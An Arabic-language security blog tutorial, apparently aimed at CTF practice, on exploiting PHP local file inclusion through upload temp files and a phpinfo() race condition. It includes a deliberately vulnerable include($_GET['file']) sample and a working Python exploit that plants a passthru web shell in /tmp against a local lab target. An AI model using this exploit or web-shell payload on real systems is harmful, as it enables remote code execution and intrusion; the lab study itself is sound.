@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="light"><head>
+    <title> MtucX | lfi </title>
+    <meta charset="utf-8"><meta name="generator" content="Hugo 0.70.0" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+    <meta name="description" content="Call me 4dla3">
+    
+    <link rel="stylesheet" href="https://h4dla3.github.io/css/style.min.67cd718c0a3c8009c771494d381fb7128246a454bd0518fed97cb65d257db948.css" integrity="sha256-Z81xjAo8gAnHcUlNOB&#43;3EoJGpFS9BRj&#43;2Xy2XSV9uUg=" crossorigin="anonymous" type="text/css">
+    
+    <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+    
+    <link rel="shortcut icon" href="https://h4dla3.github.io/favicons/favicon.ico" type="image/x-icon">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://h4dla3.github.io/favicons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://h4dla3.github.io/favicons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://h4dla3.github.io/favicons/favicon-16x16.png">
+    <link rel="canonical" href="https://h4dla3.github.io/post/ctf_tips/">
+    
+    
+    <script type="text/javascript" src="https://h4dla3.github.io/js/anatole-header.min.c275265a259296f3dd50e8236a77fcbcadb1dbb9597d3045c675dcc2c7c58a93.js" integrity="sha256-wnUmWiWSlvPdUOgjanf8vK2x27lZfTBFxnXcwsfFipM=" crossorigin="anonymous"></script>
+    <meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://h4dla3.github.io/images/site-feature-image.png"/>
+
+<meta name="twitter:title" content="lfi"/>
+<meta name="twitter:description" content="بسم الله الرحمن الرحيم
+السلام عليكم ورحمة الله تعالى و بركاته
+https://www.php.net/manual/en/function.include.php
+https://www.php.net/manual/en/function.phpinfo
+في البداية
+Understanding PHP temporary files
+في البداية
+https://www.php.net/manual/en/features.file-upload.post-method.php
+https://www.php.net/manual/en/features.file-upload.put-method.php
+https://www.macs.hw.ac.uk/~hwloidl/docs/PHP/features.file-upload.html
+يمكننا استعمال بوست او put ميثود لرفع الملفات في بي اش بي , بعد رفع الملف , الملف سوف يحفظ في global variables يدعى $_files الاراي تحتوي على بعض المعلومات كالتالي"/>
+
+</head><body><div class="sidebar animated fadeInDown">
+    <div class="logo-title">
+      <div class="title">
+        <img src="https://h4dla3.github.io/images/mtucx.jpg" alt="profile picture">
+        <h3 title=""><a href="/">MtucX</a></h3>
+        <div class="description">
+          <p>Call me 4dla3</p>
+        </div>
+      </div>
+    </div>
+    <ul class="social-links">
+        
+        <li>
+        <a href="https://github.com/h4dla3" rel="me" aria-label="GitHub">
+          <i class="fa fa-2x fa-github" aria-hidden="true"></i>
+        </a>          
+        </li>
+
+        
+    </ul>
+    <div class="footer">
+        <div class="by_farbox">&copy; MtucX 2020 </div>
+      </div>
+    </div>
+</div><div class="main">
+            <div class="page-top animated fadeInDown">
+    <ul class="nav">
+        
+        
+        
+        <li><a  href="/" title="">Home</a></li>
+        
+        
+        <li><a  href="/post/" title="">Posts</a></li>
+        
+        
+        <li><a  href="/about/" title="">About</a></li>
+        
+    </ul>
+    <div class="themeswitcher">
+        <a class="theme-switch" title="Switch Theme">
+            <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+        </a>
+    </div>
+</div>
+
+            <div class="autopagerize_page_element">
+                <div class="content">
+<div class="post animated fadeInDown">
+    <div class="post-content">
+
+      <div class="post-title">
+        <h3>lfi
+        </h3>
+        
+        <div class="info">
+          <i class="fa fa-sun-o"></i><span class="date">Fri, Jul 10, 2020</span>
+          <i class="fa fa-clock-o"></i><span class="reading-time">4-minute read</span>
+        </div>
+        
+        </div>
+
+    <!-- raw HTML omitted -->
+<p>بسم الله الرحمن الرحيم</p>
+<p>السلام عليكم ورحمة الله تعالى و بركاته</p>
+<p><a href="https://www.php.net/manual/en/function.include.php">https://www.php.net/manual/en/function.include.php</a></p>
+<p><a href="https://www.php.net/manual/en/function.phpinfo">https://www.php.net/manual/en/function.phpinfo</a></p>
+<p>في البداية</p>
+<p>Understanding PHP temporary files</p>
+<p>في البداية</p>
+<p><a href="https://www.php.net/manual/en/features.file-upload.post-method.php">https://www.php.net/manual/en/features.file-upload.post-method.php</a></p>
+<p><a href="https://www.php.net/manual/en/features.file-upload.put-method.php">https://www.php.net/manual/en/features.file-upload.put-method.php</a></p>
+<p><a href="https://www.macs.hw.ac.uk/~hwloidl/docs/PHP/features.file-upload.html">https://www.macs.hw.ac.uk/~hwloidl/docs/PHP/features.file-upload.html</a></p>
+<p>يمكننا استعمال بوست او put ميثود لرفع الملفات
+في بي اش بي , بعد رفع الملف , الملف سوف يحفظ في global variables يدعى $_files
+الاراي تحتوي على بعض المعلومات
+كالتالي</p>
+<p><img src="/images/2020-07-10_094131.png" alt="Images"></p>
+<p>للمزيد من المعلومات</p>
+<p><a href="https://arabicprogrammer.com/article/8708534101/">https://arabicprogrammer.com/article/8708534101/</a></p>
+<p>بعد رفع الملف سوف يخزن في default temp dir
+للسيرفر
+by default</p>
+<p>يمكنك ان تجده كالتالي في php.ini</p>
+<!-- raw HTML omitted -->
+<p>ملاحظة انا هنا قمت بتغييره الى d:/phpstudy_pro/temp</p>
+<p>قبل التعدلي عليه كان ; upload_tmp_dir</p>
+<p>اظن في wamp c:/wamp/tmp</p>
+<p>المهم يمكنك معرفة من php.ini كالصورة اعلاه</p>
+<p>في ubuntu سوف تكون كالتالي</p>
+<pre><code>cat /etc/php/7.0/apache2/php.ini | grep upload_tmp
+;upload_tmp_dir =
+</code></pre><p>اذا كان المسار الخاص ب upload_tmp_dir غير writable . بي اش بي
+سوف يقوم بحفظه في system default temp dir .</p>
+<p>اذا كان upload_tmp_dir غير محدد</p>
+<p>سيتم استخدام  temp directory الافتراضي للنظام</p>
+<p>sys_get_temp_dir()</p>
+<!-- raw HTML omitted -->
+<pre><code>default
+
+C:\Users\lol&gt;php -r &quot;echo sys_get_temp_dir();&quot;
+C:\Users\lol\AppData\Local\Temp
+
+edited
+قمت بتغييره في php.ini ايضا
+
+sys_temp_dir = &quot;D:/phpstudy_pro/temp&quot;
+
+C:\Users\lol&gt;php -r &quot;echo sys_get_temp_dir();&quot;
+D:/phpstudy_pro/temp
+C:\Users\lol&gt;
+
+</code></pre><p>ubuntu</p>
+<pre><code>➜ ~ php -r &quot;echo sys_get_temp_dir();&quot;
+/tmp
+➜  ~ 
+</code></pre><!-- raw HTML omitted -->
+<h1 id="التسمية-للملفات-المؤقتة">التسمية للملفات المؤقتة</h1>
+<p>بعد التحميل والتخزين في temp directory ،
+قواعد تسمية الملفات المؤقتة هي كما يلي: الافتراضي هو php+4 أو php+6 أرقام عشوائية وأحرف كبيرة وصغيرة</p>
+<p>مثال :</p>
+<!-- raw HTML omitted -->
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+$file <span style="color:#f92672">=</span> <span style="color:#a6e22e">tmpfile</span>();
+$path <span style="color:#f92672">=</span> <span style="color:#a6e22e">stream_get_meta_data</span>($file)[<span style="color:#e6db74">&#39;uri&#39;</span>];
+<span style="color:#66d9ef">print</span> $path<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+
+</code></pre></div><p>windows</p>
+<p><img src="/images/2020-07-10_121408.png" alt="Images"></p>
+<!-- raw HTML omitted -->
+<p>ترى في ويندوز</p>
+<p>php????.tmp</p>
+<p>يحتوي على لاحقة tmp تحت النوافذ ، ويحتوي الملف على أربعة أحرف عشوائية</p>
+<p>linux كما نرى في</p>
+<p>لا يوجد لاحقة في Linux ، ولكن الأحرف العشوائية للملف تتكون بشكل عام من ستة أرقام ،</p>
+<!-- raw HTML omitted -->
+<p>php???????</p>
+<!-- raw HTML omitted -->
+<p><img src="/images/2020-07-10_123241.png" alt="Images"></p>
+<p>كما نلاحظ فانه يكون ارقام و حروف كبيرة و صغير و يكون عشوائية</p>
+<p>في ويندوز بي اتش بي يستعمل GetTempFileName()
+و في لينكس and mkstemp()</p>
+<p>للمزيد من المعلومات</p>
+<p><a href="https://stackoverflow.com/questions/13037969/how-are-tmp-file-names-in-php-generated">https://stackoverflow.com/questions/13037969/how-are-tmp-file-names-in-php-generated</a></p>
+<p><a href="https://linux.die.net/man/3/mktemp">https://linux.die.net/man/3/mktemp</a></p>
+<p><a href="https://linux.die.net/man/3/mkstemp">https://linux.die.net/man/3/mkstemp</a></p>
+<p><a href="https://stackoverflow.com/questions/29250512/php-uploads-filesfilenametmp-name-uniqueness">https://stackoverflow.com/questions/29250512/php-uploads-filesfilenametmp-name-uniqueness</a></p>
+<p><a href="https://github.com/php/php-src/blob/master/main/php_open_temporary_file.c">https://github.com/php/php-src/blob/master/main/php_open_temporary_file.c</a></p>
+<p>الصورة من PHP_LFI_rfc1867_temporary_files</p>
+<p>في الصورة التالية</p>
+<p>مخطط دورة التشغيل لـ PHP عند تحميل الملفات من خلال  POST.</p>
+<p><img src="/images/2020-07-10_110539.png" alt="Images"></p>
+<p>يمكنك أن ترى أن فترة بقاء ملفاتنا المؤقتة هي الفترة الزمنية كالتالي</p>
+<p><img src="/images/2020-07-10_1105391.png" alt="Images"></p>
+<p>لو انه php انتهى بدون مشاكل و الملف لم ينقل الى مكان اخر او اعادة تسميته</p>
+<p>سيتم حذف الملف في نهاية form request</p>
+<h1 id="انتباه">انتباه</h1>
+<p>ولكن لو انه لم ينتهي بشكل غير طبيعي أثناء تشغيل php</p>
+<p>مثل حدوث crash فانه سيتم الاحتفاظ بهذا الملف المؤقت بشكل دائم.</p>
+<h1 id="كيفية-الحصول-على-اسم-الملف">كيفية الحصول على اسم الملف</h1>
+<p>1 - لدينا lfi و عرفنا كيفية التسمية للملفات المؤقة
+يمكننا عمل تخمين على اسم الملف يمكن استعمال سكربت لعمل تخمين</p>
+<p>2 - تتمثل الطريقة في الحصول من خلال  /proc/self/fd/* ، يبدأ * من 10 ، ويتم هنا الحصول على بعض الروابط الرمزية لمعرف العملية قيد التشغيل حاليًا. تعتمد فعالية هذه الطريقة على حجم الملف الذي تم تحميله ، ويمكن أن تزيد الملفات الكبيرة من وقت المحاولة.</p>
+<p>3 - في ويندوز . يمكنك استعمال FindFirstFile method
+للمزيد من المعلومات يمكنك دراسة السورس الخاص ب fimap او البحث في قوقل</p>
+<p><a href="https://github.com/kurobeats/fimap/wiki/FimapFindFirstFileExploit">https://github.com/kurobeats/fimap/wiki/FimapFindFirstFileExploit</a></p>
+<h1 id="exploiting-time">Exploiting time</h1>
+<p>الان بعد معرفة بعض الاساسيات
+ننتقل الى الشرح</p>
+<h1 id="lfi-with-phpinfo-assistance">LFI With PHPInfo Assistance</h1>
+<p><a href="https://insomniasec.com/cdn-assets/LFI_With_PHPInfo_Assistance.pdf">https://insomniasec.com/cdn-assets/LFI_With_PHPInfo_Assistance.pdf</a></p>
+<p><a href="http://gynvael.coldwind.pl/download.php?f=PHP_LFI_rfc1867_temporary_files.pdf">http://gynvael.coldwind.pl/download.php?f=PHP_LFI_rfc1867_temporary_files.pdf</a></p>
+<p>فل نقل انه هناك local file include
+لكنك لم تجد اي طريقة لاستغلالها و لكنه يوجد
+phpinfo() script</p>
+<p>لدينا المثال التالي</p>
+<!-- raw HTML omitted -->
+<p>index.php</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+<span style="color:#66d9ef">include</span>($_GET[<span style="color:#e6db74">&#39;file&#39;</span>]);
+<span style="color:#75715e">?&gt;</span>
+</code></pre></div><p>info.php</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+<span style="color:#a6e22e">phpinfo</span>();
+<span style="color:#75715e">?&gt;</span>
+</code></pre></div><!-- raw HTML omitted -->
+<p>تكمن الفكرة وراء أسلوب الاستغلال هذا في أنه إذا قبلت PHP تحميل الملفات كالتالي.</p>
+<p><img src="/images/2020-07-09_214428.png" alt="Images"></p>
+<p><img src="/images/2020-07-09_214614.png" alt="Images"></p>
+<p>من خلال محاولة اجراء عدة upload post لل phpinfo سكريبت
+والتحكم بعناية في القراءات ، فمن الممكن
+استرداد اسم الملف المؤقت وتقديم طلب إلى البرنامج النصي LFI</p>
+<p>إذا تمكنا من إنشاء ملف كبير بما فيه الكفاية مع كود php  ، يجب أن نكون قادرين على التقاط هذه التعليمات قبل حذف الملف ،</p>
+<p>وبالتالي  race condition.</p>
+<p>يمكنك استعمال السكربت التالي</p>
+<!-- raw HTML omitted -->
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
+<span style="color:#f92672">import</span> ssl
+<span style="color:#f92672">import</span> socket
+<span style="color:#f92672">import</span> urllib3
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">SubstrFind</span>(resp, toFind):
+	<span style="color:#66d9ef">if</span>(len(toFind) <span style="color:#f92672">&gt;</span> len(resp)):
+		<span style="color:#66d9ef">return</span> []
+
+	found <span style="color:#f92672">=</span> False
+	indexes <span style="color:#f92672">=</span> []
+
+	<span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,(len(resp)<span style="color:#f92672">-</span>len(toFind))<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>):
+		<span style="color:#66d9ef">if</span>(ord(resp[x]) <span style="color:#f92672">==</span> ord(toFind[<span style="color:#ae81ff">0</span>])):
+			found <span style="color:#f92672">=</span> True
+			<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,len(toFind)):
+				<span style="color:#66d9ef">if</span>(ord(resp[x<span style="color:#f92672">+</span>i]) <span style="color:#f92672">!=</span> ord(toFind[i])):
+					found <span style="color:#f92672">=</span> False
+					<span style="color:#66d9ef">break</span>
+		<span style="color:#66d9ef">if</span>(found):
+			indexes<span style="color:#f92672">.</span>append(x)
+			found <span style="color:#f92672">=</span> False
+			x <span style="color:#f92672">+=</span> len(toFind)
+
+	<span style="color:#66d9ef">return</span> indexes
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">phpinfo_ext</span>(content):
+	indexes <span style="color:#f92672">=</span> SubstrFind(content, <span style="color:#e6db74">&#34;Security Test&#34;</span>)
+	found <span style="color:#f92672">=</span> len(indexes) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>
+	got <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+
+	<span style="color:#66d9ef">if</span>(found):
+		start <span style="color:#f92672">=</span> indexes[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">+</span><span style="color:#ae81ff">11</span>
+		<span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(start, len(content)):
+			<span style="color:#66d9ef">if</span>(content[x] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;&lt;&#39;</span>):
+				<span style="color:#66d9ef">break</span>
+			got <span style="color:#f92672">+=</span> content[x]
+
+	<span style="color:#66d9ef">return</span> got
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">phpinfo_request</span>(): 
+	TAG<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Security Test&#34;</span>
+	PAYLOAD<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">&lt;?php $c=fopen(&#39;/tmp/ccc&#39;,&#39;w&#39;);fwrite($c,&#39;&lt;?php passthru($_GET[&#34;f&#34;]);?&gt;&#39;);?&gt;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;&#34;&#34;</span> <span style="color:#f92672">%</span> TAG
+	REQ1_DATA<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;&#34;-----------------------------7dbff1ded0714</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">Content-Disposition: form-data; name=&#34;dummyname&#34;; filename=&#34;test.txt&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">Content-Type: text/plain</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">%s</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">-----------------------------7dbff1ded0714--</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;&#34;&#34;</span> <span style="color:#f92672">%</span> PAYLOAD
+	padding<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">6000</span>
+	REQ1<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;&#34;POST /info.php&#34;&#34;&#34;&#34;&#34;&#34; HTTP/1.1</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">Z: &#34;&#34;&#34;</span><span style="color:#f92672">+</span>padding<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">Cookie: othercookie=&#34;&#34;&#34;</span><span style="color:#f92672">+</span>padding<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">HTTP_ACCEPT: &#34;&#34;&#34;</span> <span style="color:#f92672">+</span> padding <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">HTTP_USER_AGENT: &#34;&#34;&#34;</span><span style="color:#f92672">+</span>padding<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">HTTP_ACCEPT_LANGUAGE: &#34;&#34;&#34;</span><span style="color:#f92672">+</span>padding<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">HTTP_PRAGMA: &#34;&#34;&#34;</span><span style="color:#f92672">+</span>padding<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">Content-Length: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">Host: 127.0.0.1</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;&#34;&#34;</span> <span style="color:#f92672">%</span>(len(REQ1_DATA),REQ1_DATA)
+
+	got <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span> 
+	sc <span style="color:#f92672">=</span> urllib3<span style="color:#f92672">.</span>connection_from_url(<span style="color:#e6db74">&#39;http://127.0.0.1&#39;</span>)<span style="color:#f92672">.</span>_new_conn()
+	sc<span style="color:#f92672">.</span>connect()
+	sc <span style="color:#f92672">=</span> sc<span style="color:#f92672">.</span>sock
+
+	payload <span style="color:#f92672">=</span> REQ1
+	sc<span style="color:#f92672">.</span>send(payload)
+
+	resp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+	<span style="color:#66d9ef">while</span> <span style="color:#e6db74">&#39;tmp_name&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> resp:
+		x <span style="color:#f92672">=</span> sc<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)
+		<span style="color:#66d9ef">if</span> x <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;&#39;</span>:
+			<span style="color:#66d9ef">break</span>
+		resp <span style="color:#f92672">+=</span> x
+	<span style="color:#66d9ef">if</span>(<span style="color:#e6db74">&#34;tmp_name&#34;</span> <span style="color:#f92672">in</span> resp):
+		found <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+		lines <span style="color:#f92672">=</span> resp<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+		<span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> lines:
+			<span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;tmp_name]&#34;</span> <span style="color:#f92672">in</span> line:
+				mystr <span style="color:#f92672">=</span> str(line)
+				array <span style="color:#f92672">=</span> mystr<span style="color:#f92672">.</span>split()
+				tmp_name <span style="color:#f92672">=</span> array[<span style="color:#ae81ff">2</span>]
+				<span style="color:#66d9ef">print</span>(tmp_name)
+				<span style="color:#66d9ef">break</span>
+		tmp_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://127.0.0.1/index.php?file=&#34;</span> <span style="color:#f92672">+</span> tmp_name
+		r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(tmp_url)<span style="color:#75715e">#</span>
+
+		content <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>content
+		<span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;Security Test&#39;</span> <span style="color:#f92672">in</span> content:
+			<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;done&#34;</span>
+			exit()
+		<span style="color:#66d9ef">else</span>:
+			<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;wait ... &#39;</span>)
+
+	<span style="color:#66d9ef">return</span> got
+		
+
+
+<span style="color:#66d9ef">while</span> True:
+	<span style="color:#66d9ef">print</span>(phpinfo_request())
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo inotifywait -m -r /tmp
+</code></pre></div><p><img src="/images/2020-07-10_153338.png" alt="Images"></p>
+<!-- raw HTML omitted -->
+<p>كما نلاحظ في الصورة انه قام بانشاء ملف يدعى ccc
+وقام بالتعديل عليه لكنه لم يقم بحذفه</p>
+<p>الان
+نذهب الى المتصفح و نجرب</p>
+<p><img src="/images/2020-07-10_154005.png" alt="Images"></p>
+<!-- raw HTML omitted -->
+<p>ctf challenge : <a href="https://h4dla3.github.io/post/eagle-jump/">https://h4dla3.github.io/post/eagle-jump/</a> اقرا الجزء الثاني من التحدي</p>
+<p>docker container : <a href="https://github.com/vulhub/vulhub/tree/master/php/inclusion">https://github.com/vulhub/vulhub/tree/master/php/inclusion</a></p>
+<h1 id="-php7-segment-fault--using-phpfilterstringstrip_tags">( php7 segment fault ) using php://filter/string.strip_tags</h1>
+<!-- raw HTML omitted -->
+<p>الاصدارات المصابة</p>
+<p>هذه الطريقة
+php7.0.0 / 7.1.2</p>
+<p>php7.1.2*</p>
+
+    </div>
+    <div class="post-footer">
+      <div class="info">
+        
+        
+      </div>
+    </div>
+
+    
+           
+    
+</div>
+
+
+                </div>
+            </div>
+        </div>
+</body>
+
+
+
+<script type="text/javascript" src="https://h4dla3.github.io/js/jquery.min.86b1e8f819ee2d9099a783e50b49dff24282545fc40773861f9126b921532e4c.js" integrity="sha256-hrHo&#43;BnuLZCZp4PlC0nf8kKCVF/EB3OGH5EmuSFTLkw=" crossorigin="anonymous"></script>
+
+
+
+
+<script type="text/javascript" src="https://h4dla3.github.io/js/bundle.min.0f9c74cb78f13d1f15f33daff4037c70354f98acfbb97a6f61708966675c3cae.js" integrity="sha256-D5x0y3jxPR8V8z2v9AN8cDVPmKz7uXpvYXCJZmdcPK4=" crossorigin="anonymous"></script>
+
+<script type="text/javascript" src="https://h4dla3.github.io/js/medium-zoom.min.92f21c856129f84aeb719459b3e6ac621a3032fd7b180a18c04e1d12083f8aba.js" integrity="sha256-kvIchWEp&#43;ErrcZRZs&#43;asYhowMv17GAoYwE4dEgg/iro=" crossorigin="anonymous"></script></html></body>
+
+</html>
